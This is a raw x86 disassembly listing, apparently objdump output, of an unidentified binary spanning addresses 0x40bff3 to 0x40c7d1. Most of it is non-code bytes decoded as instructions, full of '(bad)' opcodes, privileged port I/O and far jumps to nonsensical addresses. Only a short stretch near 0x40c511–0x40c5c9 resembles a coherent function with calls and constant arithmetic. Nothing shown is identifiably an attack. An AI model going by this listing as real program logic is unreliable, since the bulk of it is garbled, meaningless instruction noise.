  40bff3:	rcl    DWORD PTR [edi+0x7a],cl
  40bff6:	out    dx,al
  40bff7:	arpl   WORD PTR es:[eax+edx*2+0x6],bp
  40bffc:	mov    ds:0xece50208,eax
  40c001:	repz daa 
  40c003:	xchg   edx,eax
  40c004:	ror    BYTE PTR [edi-0x4c0ba9b1],1
  40c00a:	imul   edx,DWORD PTR [edi-0x2a6f8c56],0xffffffed
  40c011:	pop    es
  40c012:	cmp    eax,0x7a6ec378
  40c017:	imul   edi,DWORD PTR [eax],0x3e
  40c01a:	sbb    BYTE PTR [edi+0x24ce97c0],cl
  40c020:	mov    dh,0x6f
  40c022:	push   edi
  40c023:	test   DWORD PTR [ecx],eax
  40c025:	sti    
  40c026:	jne    0x40bfcc
  40c028:	rol    edi,cl
  40c02a:	(bad)  
  40c02b:	out    0xd3,al
  40c02d:	and    BYTE PTR [esi],dh
  40c02f:	add    DWORD PTR [ecx+0x5f9e9058],edx
  40c035:	mov    ah,0x61
  40c037:	sahf   
  40c038:	sub    ecx,DWORD PTR [ecx]
  40c03a:	mov    edi,0x7589bbd9
  40c03f:	lock mov bh,0x8b
  40c042:	pushf  
  40c043:	sub    eax,0x397e7361
  40c048:	enter  0xaab0,0xe6
  40c04c:	out    dx,al
  40c04d:	push   edi
  40c04e:	ins    BYTE PTR es:[edi],dx
  40c04f:	fwait
  40c050:	test   DWORD PTR [eax],0xc5674bed
  40c056:	mov    ebp,0xed5da2c
  40c05b:	or     ecx,DWORD PTR [edx-0x1eeaae5e]
  40c061:	xchg   ebx,eax
  40c062:	pop    esi
  40c063:	xchg   DWORD PTR [eax+0x37],esi
  40c066:	add    al,0x65
  40c068:	dec    ecx
  40c069:	sub    al,0x70
  40c06b:	fidiv  WORD PTR [ecx+ebx*1-0x3a]
  40c06f:	in     al,dx
  40c070:	in     al,dx
  40c071:	pop    ds
  40c072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c073:	or     eax,0x21b47b41
  40c078:	mov    ecx,fs
  40c07a:	pop    edx
  40c07b:	push   eax
  40c07c:	out    dx,al
  40c07d:	jp     0x40c0c3
  40c07f:	jg     0x40c045
  40c081:	scas   al,BYTE PTR es:[edi]
  40c082:	fist   DWORD PTR [edi+edx*2]
  40c085:	shl    DWORD PTR [eax+0x1f],cl
  40c088:	in     eax,dx
  40c089:	mov    WORD PTR [esi],es
  40c08b:	mov    ds:0x94c0b9c9,al
  40c090:	xor    BYTE PTR ds:0x45b96f8f,0xf1
  40c097:	xor    dh,0xb3
  40c09a:	xchg   ebx,eax
  40c09b:	xor    al,0xcf
  40c09d:	mov    bh,0x2c
  40c09f:	out    dx,eax
  40c0a0:	cmp    al,0x88
  40c0a2:	daa    
  40c0a3:	out    dx,al
  40c0a4:	jge    0x40c0c7
  40c0a6:	mov    eax,0x8abab476
  40c0ab:	or     al,0xe7
  40c0ad:	push   esp
  40c0ae:	loopne 0x40c0e8
  40c0b0:	mov    eax,ds:0xaf118c1b
  40c0b5:	int    0x58
  40c0b7:	or     BYTE PTR ds:[esi-0x35b536a],dh
  40c0be:	loop   0x40c05f
  40c0c0:	push   eax
  40c0c1:	test   ch,al
  40c0c3:	rol    BYTE PTR [eax+0x533987c5],1
  40c0c9:	cmp    al,0x63
  40c0cb:	test   al,0x52
  40c0cd:	xor    al,0x5b
  40c0cf:	jb     0x40c103
  40c0d1:	pop    ebp
  40c0d2:	adc    BYTE PTR [edx+0x23ce65c8],0x5f
  40c0d9:	icebp  
  40c0da:	sbb    ebp,DWORD PTR [eax]
  40c0dc:	dec    eax
  40c0dd:	mov    esp,0x394acbd3
  40c0e2:	mov    bl,0x62
  40c0e4:	and    BYTE PTR [edx-0x6e3c82f5],dh
  40c0ea:	add    ch,al
  40c0ec:	nop
  40c0ed:	mov    ?,WORD PTR [ebx-0x2e]
  40c0f0:	out    0x66,al
  40c0f2:	mov    ah,0x6
  40c0f4:	scas   eax,DWORD PTR es:[edi]
  40c0f5:	mov    eax,0xd1c5b43b
  40c0fa:	ins    DWORD PTR es:[edi],dx
  40c0fb:	imul   edx,eax,0x12f4e446
  40c101:	push   edx
  40c102:	jae    0x40c0e0
  40c104:	sbb    al,BYTE PTR [edi]
  40c106:	dec    esp
  40c107:	pop    ebp
  40c108:	xor    BYTE PTR [ecx],ah
  40c10a:	rcr    DWORD PTR [ebx],1
  40c10c:	cwde   
  40c10d:	jg     0x40c173
  40c10f:	in     al,dx
  40c110:	loopne 0x40c0bb
  40c112:	push   esi
  40c114:	inc    eax
  40c115:	repnz hlt 
  40c117:	imul   esi,DWORD PTR [eax-0x14],0xffffffde
  40c11b:	jecxz  0x40c184
  40c11d:	dec    edi
  40c11e:	cmp    al,0x61
  40c121:	call   0xb6cf:0x19396d8
  40c128:	std    
  40c129:	pop    ecx
  40c12a:	sbb    edi,0x7dc6104
  40c130:	add    BYTE PTR [ebx-0x60827489],ch
  40c136:	adc    ebx,ecx
  40c138:	fsubr  QWORD PTR [ecx]
  40c13a:	push   ds
  40c13b:	fs cli 
  40c13d:	push   edi
  40c13e:	iret   
  40c13f:	mov    esp,0x14053103
  40c144:	push   edi
  40c145:	(bad)  
  40c146:	stos   DWORD PTR es:[edi],eax
  40c147:	dec    esi
  40c148:	xchg   edi,eax
  40c149:	out    0x72,eax
  40c14b:	in     al,0xc5
  40c14d:	sti    
  40c14e:	fwait
  40c14f:	jge    0x40c0d1
  40c151:	add    ah,ah
  40c153:	and    al,0xf8
  40c155:	sbb    al,0x25
  40c157:	sbb    BYTE PTR [ecx-0x4df65758],cl
  40c15d:	(bad)  
  40c15e:	xlat   BYTE PTR ds:[ebx]
  40c15f:	dec    edx
  40c160:	je     0x40c127
  40c162:	fdivr  DWORD PTR [edi-0x4]
  40c165:	or     eax,0x9703db4f
  40c16a:	mov    cl,0x9
  40c16c:	mov    eax,ds:0x5edd5958
  40c171:	xchg   DWORD PTR [eax+0x13],ecx
  40c174:	imul   edi,ecx,0x7
  40c177:	or     al,BYTE PTR [esi]
  40c179:	fcom   QWORD PTR [eax*1+0x73f9132d]
  40c180:	xchg   ecx,eax
  40c181:	aam    0x2c
  40c183:	repz add al,0xb0
  40c186:	test   al,0x10
  40c188:	xor    BYTE PTR ds:0xbc97dc2,ah
  40c18e:	(bad)  
  40c18f:	into   
  40c190:	repz sub al,ah
  40c193:	dec    esp
  40c194:	pushf  
  40c195:	dec    ecx
  40c197:	sbb    al,0x8b
  40c199:	add    cl,ch
  40c19b:	jb     0x40c1a0
  40c19d:	add    BYTE PTR [eax],al
  40c19f:	dec    edi
  40c1a0:	cmp    eax,0xadb89f2a
  40c1a5:	dec    edi
  40c1a6:	cmp    eax,0x3bf5c87e
  40c1ab:	retf   0x35c1
  40c1ae:	jno    0x40c219
  40c1b0:	les    edi,FWORD PTR [ebx-0x443a9945]
  40c1b6:	mov    ebx,0x3b8ff7d8
  40c1bb:	sub    edx,esp
  40c1bd:	pop    ebx
  40c1be:	(bad)  
  40c1bf:	sub    al,BYTE PTR [ebx]
  40c1c1:	mov    DWORD PTR [esi+ecx*4],ecx
  40c1c4:	dec    edi
  40c1c5:	push   esi
  40c1c6:	xchg   ebx,eax
  40c1c7:	(bad)  
  40c1c9:	(bad)  
  40c1ca:	mov    DWORD PTR [ecx],eax
  40c1cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1cd:	or     bl,ch
  40c1cf:	popf   
  40c1d0:	dec    esp
  40c1d1:	int3   
  40c1d2:	cs push edi
  40c1d4:	fwait
  40c1d5:	or     dh,BYTE PTR [ecx-0x15]
  40c1d8:	(bad)  
  40c1d9:	cmp    dh,bl
  40c1db:	nop
  40c1dc:	mov    bh,0xac
  40c1de:	sbb    eax,0x3014b3a6
  40c1e3:	loop   0x40c179
  40c1e5:	pop    ebp
  40c1e6:	mov    ebp,0x40d2b7c2
  40c1eb:	sub    BYTE PTR [ebx-0x23],ah
  40c1ee:	retf   0x78ff
  40c1f1:	(bad)  
  40c1f2:	xchg   esp,eax
  40c1f3:	ds jo  0x40c236
  40c1f6:	shl    BYTE PTR [ebp+0x7e03f1a9],1
  40c1fc:	push   cs
  40c1fd:	nop
  40c1fe:	out    0xa4,al
  40c200:	mov    edi,eax
  40c202:	xchg   edi,eax
  40c203:	mov    ch,0x6a
  40c205:	mov    cs,WORD PTR [esi-0x1b5a2bd]
  40c20b:	mov    edx,edx
  40c20d:	pop    edx
  40c20e:	(bad)  
  40c20f:	push   ss
  40c210:	adc    DWORD PTR [eax+0x5ccde4ba],0xffffffe1
  40c217:	fisttp WORD PTR [ecx-0x5ee89f9f]
  40c21d:	xor    ebx,eax
  40c21f:	std    
  40c220:	and    DWORD PTR [eax],ecx
  40c222:	jp     0x40c1be
  40c224:	(bad)  [edi]
  40c226:	hlt    
  40c227:	jecxz  0x40c1d0
  40c229:	add    DWORD PTR [edx],edx
  40c22b:	mov    edx,0x9ef31146
  40c230:	dec    ebp
  40c231:	loopne 0x40c263
  40c233:	push   ebp
  40c234:	push   ds
  40c235:	adc    eax,0x41844376
  40c23a:	lods   al,BYTE PTR ds:[esi]
  40c23b:	cli    
  40c23c:	pop    es
  40c23d:	popa   
  40c23e:	and    eax,0x29c5b455
  40c243:	fimul  DWORD PTR [ecx]
  40c245:	aad    0xf5
  40c247:	jge    0x40c28a
  40c249:	repz cmp cl,BYTE PTR [eax]
  40c24c:	mov    ah,0xfc
  40c24e:	fcomp  QWORD PTR [esi+ebx*2-0x18aa6ded]
  40c255:	js     0x40c26d
  40c257:	rcl    DWORD PTR [ebx+0x4b692957],0x9a
  40c25e:	dec    edi
  40c25f:	dec    esp
  40c260:	rcl    DWORD PTR [eax+0x6bd5111b],cl
  40c266:	sbb    al,0x79
  40c268:	jle    0x40c237
  40c26a:	ds out 0x8f,al
  40c26d:	call   0xcdbb1634
  40c272:	dec    eax
  40c273:	retf   0x8d3a
  40c276:	jb     0x40c24e
  40c278:	dec    ebp
  40c279:	push   0xffffffd7
  40c27b:	xchg   DWORD PTR [esi-0x2c],esi
  40c27e:	int3   
  40c27f:	pop    esi
  40c280:	mov    esp,0x732e9715
  40c285:	sbb    BYTE PTR [ebx],bl
  40c287:	(bad)  
  40c288:	mov    WORD PTR [ebp+0x76],cs
  40c28b:	jo     0x40c248
  40c28d:	out    0xe7,al
  40c28f:	jecxz  0x40c297
  40c291:	adc    esp,DWORD PTR [esi-0x5c]
  40c294:	ror    DWORD PTR [edi+ecx*4-0x5755a5be],0x2d
  40c29c:	std    
  40c29d:	adc    eax,0xddaf7204
  40c2a2:	in     al,0xaa
  40c2a4:	test   DWORD PTR [edi+0x7ecf3770],edi
  40c2aa:	ror    BYTE PTR [ebp+0x7],1
  40c2ad:	mov    ds:0x2a1f8041,al
  40c2b2:	add    BYTE PTR [ebp-0x2a0a3067],dl
  40c2b8:	retf   0xf54d
  40c2bb:	ret    
  40c2bc:	and    al,0xbb
  40c2be:	jge    0x40c26c
  40c2c0:	inc    esi
  40c2c1:	inc    eax
  40c2c2:	mov    eax,ds:0x6c55213c
  40c2c7:	data16 adc BYTE PTR [ebx],dl
  40c2ca:	loopne 0x40c2a5
  40c2cc:	dec    ebx
  40c2cd:	addr16 pushf 
  40c2cf:	jns    0x40c328
  40c2d1:	ret    
  40c2d2:	push   0xfb914034
  40c2d7:	adc    edx,DWORD PTR [esi-0x8df62bf]
  40c2dd:	cmp    BYTE PTR [esi-0x28],al
  40c2e0:	jb     0x40c2fe
  40c2e2:	loop   0x40c289
  40c2e4:	mov    ah,0x88
  40c2e6:	mov    DWORD PTR [edx+0x1b6756cd],esi
  40c2ec:	ret    0x84d6
  40c2ef:	and    eax,0x4cea1ab6
  40c2f4:	icebp  
  40c2f5:	jmp    0x40c28b
  40c2f7:	inc    eax
  40c2f8:	inc    eax
  40c2f9:	or     BYTE PTR [eax-0x30],bh
  40c2fc:	mov    eax,ds:0x95718560
  40c301:	mov    al,ds:0x1b29a912
  40c306:	xchg   ebp,eax
  40c307:	inc    esp
  40c308:	jmp    0x40c35f
  40c30a:	in     al,dx
  40c30b:	lock push 0x8ae191e0
  40c311:	sub    DWORD PTR ds:0x8a56d721,0xffffffe9
  40c318:	inc    esi
  40c319:	ja     0x40c394
  40c31b:	loop   0x40c2ca
  40c31d:	rcr    BYTE PTR [ecx-0x4a],1
  40c320:	shr    DWORD PTR [eax],1
  40c322:	push   0xa7731d6e
  40c327:	fisub  DWORD PTR [edi-0x1b]
  40c32a:	sub    edi,esi
  40c32c:	mov    eax,ds:0xc76b5a94
  40c331:	fwait
  40c332:	aaa    
  40c333:	pop    esi
  40c334:	push   ebx
  40c335:	xchg   ebp,eax
  40c336:	mov    dh,0x2c
  40c338:	enter  0x1b2,0x5b
  40c33c:	call   0x73b86f24
  40c341:	cld    
  40c342:	mov    dl,0x93
  40c344:	push   es
  40c345:	out    dx,al
  40c346:	mov    edx,0x68ea077c
  40c34b:	(bad)  
  40c34c:	jmp    0x44991c5
  40c351:	jecxz  0x40c353
  40c353:	imul   esp,DWORD PTR [eax+0x61e3e30e],0xa9e714a1
  40c35d:	xlat   BYTE PTR ds:[ebx]
  40c35e:	int3   
  40c35f:	jb     0x40c2e9
  40c361:	outs   dx,DWORD PTR ds:[esi]
  40c362:	clc    
  40c363:	mov    ebx,0x6ed5fa5b
  40c368:	sub    esi,DWORD PTR [edx+0x72b76e5d]
  40c36e:	sub    edi,edx
  40c370:	loope  0x40c385
  40c372:	push   ebx
  40c373:	push   eax
  40c374:	and    dl,BYTE PTR [ebx+0x619228f7]
  40c37a:	sub    eax,0x4a4f0725
  40c37f:	xor    al,0x37
  40c381:	jg     0x40c400
  40c383:	pop    ebx
  40c384:	adc    eax,0x3053a9a6
  40c389:	cwde   
  40c38a:	and    esi,DWORD PTR [ebx-0x41]
  40c38d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c38e:	sub    eax,0xe97c9b69
  40c393:	xchg   ecx,eax
  40c394:	out    dx,al
  40c395:	int3   
  40c396:	cdq    
  40c397:	mov    bl,0x84
  40c399:	cli    
  40c39a:	sti    
  40c39b:	fcmovbe st,st(2)
  40c39d:	dec    eax
  40c39e:	rcl    BYTE PTR [edx-0x52],0x89
  40c3a2:	ss (bad) 
  40c3a4:	(bad)  
  40c3a5:	push   ebx
  40c3a6:	sbb    DWORD PTR [esp+edx*1+0x1e9860a5],ebx
  40c3ad:	fs jmp 0xf200:0xd00fd9f4
  40c3b5:	retf   
  40c3b6:	mov    bl,0x59
  40c3b8:	sbb    eax,0x8b29c732
  40c3bd:	and    ebx,DWORD PTR [edx]
  40c3bf:	test   ebx,0xd9ab4542
  40c3c5:	or     BYTE PTR [edx],0xf
  40c3c8:	jno    0x40c3b1
  40c3ca:	push   ebp
  40c3cb:	into   
  40c3cc:	mov    esi,0xfad2416b
  40c3d1:	push   edi
  40c3d2:	shl    DWORD PTR [ebp+0x47],1
  40c3d5:	or     eax,0x2975659
  40c3da:	mov    ebx,esp
  40c3dc:	dec    edx
  40c3dd:	adc    al,0x97
  40c3df:	inc    edx
  40c3e0:	mov    al,0x63
  40c3e2:	or     bl,dl
  40c3e4:	add    DWORD PTR [eax-0x43206e60],esi
  40c3ea:	test   DWORD PTR ds:[eax+edx*4+0x6dc9c891],esi
  40c3f2:	or     eax,0x76d07764
  40c3f7:	inc    DWORD PTR [ebx]
  40c3f9:	out    dx,al
  40c3fa:	test   al,0x94
  40c3fc:	scas   al,BYTE PTR es:[edi]
  40c3fd:	or     DWORD PTR [ebx],esp
  40c3ff:	call   FWORD PTR [ecx-0x40]
  40c402:	push   DWORD PTR [esi+0x12]
  40c405:	jle    0x40c3c1
  40c407:	mov    ebx,0x3ae31d1
  40c40c:	out    0xcc,al
  40c40e:	hlt    
  40c40f:	stos   BYTE PTR es:[edi],al
  40c410:	jg     0x40c47c
  40c412:	fnsave [ecx]
  40c414:	repnz inc eax
  40c416:	test   eax,0x8dc87e26
  40c41b:	xor    DWORD PTR [ebx+0x600f90fc],edi
  40c421:	popf   
  40c422:	adc    cl,BYTE PTR [edx-0x6815919e]
  40c428:	pop    ecx
  40c429:	sub    eax,0xc57d2ba6
  40c42e:	(bad)  
  40c42f:	(bad)  
  40c431:	ins    DWORD PTR es:[edi],dx
  40c432:	shr    BYTE PTR [edi+0x21],cl
  40c435:	inc    ecx
  40c436:	out    dx,al
  40c437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c438:	push   edi
  40c439:	sub    ch,BYTE PTR ds:0xf4f67b16
  40c43f:	not    edx
  40c441:	push   ebp
  40c442:	popa   
  40c443:	rcr    BYTE PTR [edx+ebp*8],1
  40c446:	sbb    DWORD PTR [edi],0x12
  40c449:	popa   
  40c44a:	lea    edx,[ebx+0x58]
  40c44d:	sub    ecx,DWORD PTR [ecx-0x7a]
  40c450:	mov    ah,0x8b
  40c452:	fwait
  40c453:	mov    esi,0x2002502
  40c458:	loope  0x40c44a
  40c45a:	add    ecx,DWORD PTR [ebx-0x19]
  40c45d:	out    0x56,eax
  40c45f:	loopne 0x40c4bb
  40c461:	xor    ah,BYTE PTR ds:0x175406dc
  40c467:	add    eax,0x7d14d883
  40c46c:	jne    0x40c472
  40c46e:	sbb    ebp,DWORD PTR [esi-0x8]
  40c471:	aaa    
  40c472:	retf   0xaae0
  40c475:	xor    ah,BYTE PTR [edi+0x7b]
  40c478:	dec    ebx
  40c479:	mov    ecx,0x2dda0174
  40c47e:	and    eax,DWORD PTR [esi-0x64]
  40c481:	fwait
  40c482:	mov    cs:0xb39953e0,eax
  40c488:	push   eax
  40c489:	push   esp
  40c48a:	pop    esi
  40c48b:	ins    BYTE PTR es:[edi],dx
  40c48c:	mov    ds:0x3c319d71,eax
  40c491:	sub    cl,bh
  40c493:	mov    WORD PTR [ecx-0x57],?
  40c496:	mov    eax,0x25d33389
  40c49b:	sbb    BYTE PTR [edx],ch
  40c49d:	mov    es:0xd2fbd254,al
  40c4a3:	fisubr WORD PTR [ebx]
  40c4a5:	sahf   
  40c4a6:	adc    eax,0xf525ee79
  40c4ab:	nop
  40c4ac:	dec    edi
  40c4ad:	js     0x40c4b7
  40c4af:	jns    0x40c4c6
  40c4b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4b2:	dec    ebp
  40c4b3:	jl     0x40c439
  40c4b5:	mov    ds:0xe1ee138b,al
  40c4ba:	mov    ds:0x952a6cbb,al
  40c4bf:	or     bl,ah
  40c4c1:	push   ss
  40c4c2:	jb     0x40c48c
  40c4c4:	shl    eax,1
  40c4c6:	cmp    eax,0x6e16df29
  40c4cb:	jge    0x40c4c3
  40c4cd:	daa    
  40c4ce:	mov    esp,0x7b60edb1
  40c4d3:	sbb    dl,BYTE PTR [esi-0x33]
  40c4d6:	xchg   edi,eax
  40c4d7:	gs xchg edi,eax
  40c4d9:	fwait
  40c4da:	pop    ss
  40c4db:	repz or eax,0x639a972b
  40c4e1:	iret   
  40c4e2:	(bad)  
  40c4e3:	mov    cl,0xf8
  40c4e5:	test   al,0xeb
  40c4e7:	push   ebp
  40c4e8:	adc    BYTE PTR [esi+eax*1],cl
  40c4eb:	pop    es
  40c4ec:	in     eax,dx
  40c4ed:	inc    esi
  40c4ee:	mov    bh,0x2d
  40c4f0:	das    
  40c4f1:	inc    ecx
  40c4f2:	jmp    0x1f2ac2ea
  40c4f7:	xor    cl,BYTE PTR [eax-0x4d]
  40c4fa:	jo     0x40c53b
  40c4fc:	jns    0x40c517
  40c4fe:	dec    ebp
  40c4ff:	pop    ecx
  40c500:	sub    dl,0x8f
  40c503:	cmp    al,0x13
  40c505:	fiadd  DWORD PTR [eax]
  40c507:	sbb    eax,DWORD PTR [ebp+0x7f047f70]
  40c50d:	xlat   BYTE PTR ds:[ebx]
  40c50e:	add    BYTE PTR [edi],0x5e
  40c511:	call   0x40ca61
  40c516:	mov    eax,ds:0x4222a8
  40c51b:	push   0x4
  40c51d:	add    eax,0x1dc
  40c522:	push   eax
  40c523:	push   edi
  40c524:	call   0x41182a
  40c529:	mov    eax,0xcb89b67e
  40c52e:	jmp    0x40b6ba
  40c533:	mov    eax,0xcb89b676
  40c538:	mov    edx,0x9d2b8af8
  40c53d:	pop    edi
  40c53e:	pop    esi
  40c53f:	pop    ebx
  40c540:	leave  
  40c541:	ret    0x8
  40c544:	push   ebp
  40c545:	mov    ebp,esp
  40c547:	push   ecx
  40c548:	push   ecx
  40c549:	push   edi
  40c54a:	mov    eax,ds:0x4225c8
  40c54f:	mov    ecx,DWORD PTR ds:0x4225cc
  40c555:	mov    edx,DWORD PTR ds:0x4225c0
  40c55b:	mov    edi,DWORD PTR ds:0x4225c4
  40c561:	add    eax,edx
  40c563:	push   0x0
  40c565:	adc    ecx,edi
  40c567:	push   0xc3bceb98
  40c56c:	and    ecx,0x79c9
  40c572:	and    eax,0x5937
  40c577:	push   ecx
  40c578:	push   eax
  40c579:	call   0x418100
  40c57e:	xor    eax,0x1079
  40c583:	sub    eax,0x2fb3
  40c588:	mov    DWORD PTR [esi],eax
  40c58a:	mov    DWORD PTR [ebp-0x8],0x2046
  40c591:	mov    DWORD PTR [ebp-0x4],0x7ad8
  40c598:	mov    eax,ds:0x4225e0
  40c59d:	mov    ecx,DWORD PTR ds:0x4225e4
  40c5a3:	mov    edx,DWORD PTR ds:0x4225d8
  40c5a9:	mov    edi,DWORD PTR ds:0x4225dc
  40c5af:	push   ecx
  40c5b0:	push   eax
  40c5b1:	push   edi
  40c5b2:	push   edx
  40c5b3:	call   0x418100
  40c5b8:	mov    ecx,DWORD PTR ds:0x4225d0
  40c5be:	mov    edx,DWORD PTR ds:0x4225d4
  40c5c4:	xor    eax,ecx
  40c5c6:	mov    ecx,DWORD PTR [ebp-0x4]
  40c5c9:	jmp    0x40c993
  40c5ce:	jo     0x40c617
  40c5d0:	fwait
  40c5d1:	push   ss
  40c5d2:	mov    ebp,0xbaad7d36
  40c5d7:	add    esi,DWORD PTR [ebx-0x192ea3d1]
  40c5dd:	outs   dx,DWORD PTR ds:[esi]
  40c5de:	adc    al,0xcc
  40c5e0:	mov    ebx,0xbbc511bb
  40c5e5:	mov    ebx,0x537639e0
  40c5ea:	pop    ecx
  40c5eb:	test   al,ah
  40c5ed:	pop    ds
  40c5ee:	loope  0x40c5a7
  40c5f0:	xchg   ecx,eax
  40c5f1:	cmp    eax,0x81db002c
  40c5f6:	and    eax,0x9c4160a4
  40c5fb:	cmp    ecx,eax
  40c5fd:	push   edi
  40c5fe:	shl    DWORD PTR [ebx],0x62
  40c601:	aaa    
  40c602:	es ss jns 0x40c5e7
  40c606:	ret    0xb98d
  40c609:	pop    eax
  40c60a:	sub    BYTE PTR [esi-0x2c],bh
  40c60d:	retf   0x5f64
  40c610:	push   ds
  40c611:	jmp    0x40c626
  40c613:	int3   
  40c614:	(bad)  
  40c615:	(bad)  
  40c616:	pop    ebp
  40c617:	arpl   WORD PTR [esp+ebx*4+0x5d9dad07],si
  40c61e:	xchg   esi,eax
  40c61f:	inc    edx
  40c620:	sub    eax,0x26abff71
  40c625:	aam    0xf8
  40c627:	fcmovbe st,st(5)
  40c629:	or     eax,0x64a4e685
  40c62e:	mov    ds:0xbae16c24,eax
  40c633:	push   esp
  40c634:	not    DWORD PTR ds:0xea1d93c0
  40c63a:	aam    0xe6
  40c63c:	dec    ebx
  40c63d:	call   0xc1900a20
  40c642:	rcr    BYTE PTR [edi+0x20a3f4f5],0xb3
  40c649:	test   BYTE PTR [edx+eiz*1+0x455127ea],0xb5
  40c651:	mov    DWORD PTR [esi-0x77],eax
  40c654:	mov    dh,0x99
  40c656:	add    al,BYTE PTR [eax]
  40c658:	(bad)  
  40c659:	lock call 0x31b83025
  40c65f:	add    eax,0xdc82492
  40c664:	cs loopne 0x40c62d
  40c667:	dec    esi
  40c668:	fs jmp 0xeba5:0x65045fb3
  40c670:	pop    ebx
  40c671:	push   cs
  40c672:	ins    DWORD PTR es:[edi],dx
  40c673:	je     0x40c649
  40c675:	jo     0x40c5f7
  40c677:	stos   DWORD PTR es:[edi],eax
  40c678:	sbb    al,cl
  40c67a:	push   esi
  40c67b:	mov    cl,0xaf
  40c67d:	ss iret 
  40c67f:	push   cs
  40c680:	std    
  40c681:	or     BYTE PTR [eax+0x5ce561d],cl
  40c687:	cdq    
  40c688:	xchg   ecx,eax
  40c689:	mov    DWORD PTR [edi+ebx*8-0x8],ecx
  40c68d:	fadd   DWORD PTR [ebx-0x3f]
  40c690:	xchg   edx,eax
  40c691:	or     ch,dh
  40c693:	stc    
  40c694:	jns    0x40c6d5
  40c696:	nop
  40c697:	int    0x42
  40c699:	stos   BYTE PTR es:[edi],al
  40c69a:	imul   ecx,DWORD PTR [edx],0x4a15eb8e
  40c6a0:	pop    esi
  40c6a1:	iret   
  40c6a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6a3:	js     0x40c648
  40c6a5:	adc    edi,DWORD PTR [ebp+0x4c]
  40c6a8:	add    DWORD PTR ds:0xf7c8a8fe,edx
  40c6ae:	mov    cl,0x22
  40c6b0:	js     0x40c70e
  40c6b2:	jmp    0x930a:0x40f728c2
  40c6b9:	outs   dx,DWORD PTR ds:[esi]
  40c6ba:	pop    edi
  40c6bb:	aad    0x7
  40c6bd:	inc    eax
  40c6be:	fimul  DWORD PTR [ecx]
  40c6c0:	and    al,0xd9
  40c6c2:	push   esp
  40c6c3:	lock int 0x6a
  40c6c6:	cmp    esi,DWORD PTR [esi+0x6916ab0]
  40c6cc:	ret    
  40c6cd:	add    edi,esi
  40c6cf:	xlat   BYTE PTR ds:[ebx]
  40c6d0:	fadd   st,st(0)
  40c6d2:	fnstcw WORD PTR ds:0x5211408e
  40c6d8:	inc    ebx
  40c6d9:	pop    ebp
  40c6da:	push   esi
  40c6db:	sbb    DWORD PTR [edi],ecx
  40c6dd:	rol    BYTE PTR [edx+0xe5d5343],0x40
  40c6e4:	(bad)  
  40c6e5:	pusha  
  40c6e6:	mov    ds:0xe2fb1550,al
  40c6eb:	(bad)  
  40c6ec:	sbb    esp,DWORD PTR [esi+0x41fc04e1]
  40c6f2:	js     0x40c6c8
  40c6f4:	jmp    0x40c67c
  40c6f6:	and    al,0x57
  40c6f8:	pop    ds
  40c6f9:	scas   al,BYTE PTR es:[edi]
  40c6fa:	aas    
  40c6fb:	cdq    
  40c6fc:	fsubr  st,st(7)
  40c6fe:	mov    bh,0x8
  40c700:	mov    ds:0xe6252108,eax
  40c705:	int3   
  40c706:	mov    al,ds:0xfe2aca5c
  40c70b:	jecxz  0x40c776
  40c70d:	lds    ebx,FWORD PTR [edi+0x6e]
  40c710:	in     eax,dx
  40c711:	xor    eax,0x778d1907
  40c716:	fsub   QWORD PTR [ecx-0x2c29fee3]
  40c71c:	pop    eax
  40c71d:	sub    ah,ch
  40c71f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c720:	jl     0x40c731
  40c722:	and    ebx,DWORD PTR [ecx+0x3d]
  40c725:	shl    DWORD PTR [ecx-0x763ecf57],cl
  40c72b:	test   DWORD PTR [ebp+0x1b],0x66d61ec6
  40c732:	jp     0x40c78d
  40c734:	call   0x3076:0xea65b210
  40c73b:	imul   esi,edx,0xb9d0815f
  40c741:	cld    
  40c742:	fistp  DWORD PTR [edx]
  40c745:	shr    DWORD PTR [esi],1
  40c747:	xchg   esp,eax
  40c748:	and    DWORD PTR [edi],edx
  40c74a:	jbe    0x40c729
  40c74c:	mov    edx,0xd2a31b01
  40c751:	test   DWORD PTR [ebx-0x770138cf],ebp
  40c757:	fwait
  40c758:	gs jl  0x40c7b9
  40c75b:	xchg   BYTE PTR [edi],ch
  40c75d:	and    al,0xda
  40c75f:	ins    BYTE PTR es:[edi],dx
  40c760:	sbb    bh,bh
  40c762:	dec    edi
  40c763:	sbb    DWORD PTR [edx],esi
  40c765:	pop    edi
  40c766:	lock fldenv [eax+0x6f1f852b]
  40c76d:	daa    
  40c76e:	fisubr DWORD PTR [eax]
  40c770:	xor    cl,dh
  40c772:	sub    eax,0x9508960e
  40c777:	test   BYTE PTR [esi+0x45],bl
  40c77a:	clts   
  40c77c:	sub    al,0xee
  40c77e:	push   eax
  40c77f:	ficom  DWORD PTR [eax]
  40c781:	in     al,dx
  40c782:	pop    ebx
  40c783:	mov    ch,0xa9
  40c785:	mov    edx,0x45c95ce6
  40c78a:	xchg   BYTE PTR [ebx+0x4791fb6],dl
  40c790:	test   al,0xb3
  40c792:	pop    esi
  40c793:	xchg   esp,eax
  40c794:	pusha  
  40c795:	inc    BYTE PTR [ebp+eax*1+0x25230bf]
  40c79c:	dec    edx
  40c79d:	xor    al,ch
  40c79f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7a0:	pop    ss
  40c7a1:	aas    
  40c7a2:	mov    bl,0x65
  40c7a4:	int3   
  40c7a5:	scas   al,BYTE PTR es:[edi]
  40c7a6:	std    
  40c7a7:	dec    edi
  40c7a8:	ret    
  40c7a9:	or     bl,dh
  40c7ab:	call   0xabcd669e
  40c7b0:	jnp    0x40c7b5
  40c7b2:	inc    esp
  40c7b3:	data16 cmc 
  40c7b5:	cmp    eax,0xfd681e58
  40c7ba:	in     eax,0x3
  40c7bc:	rol    BYTE PTR [ecx+0x3],1
  40c7bf:	jbe    0x40c7b1
  40c7c1:	rcl    DWORD PTR [edx+0x7b],0x2a
  40c7c5:	sub    DWORD PTR [ecx+eax*8-0x6f],ebx
  40c7c9:	pusha  
  40c7ca:	cmovbe edi,DWORD PTR [ebx+0x21]
  40c7ce:	scas   eax,DWORD PTR es:[edi]
  40c7cf:	dec    ebp
  40c7d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7d1:	and    DWORD PTR [edx],edi
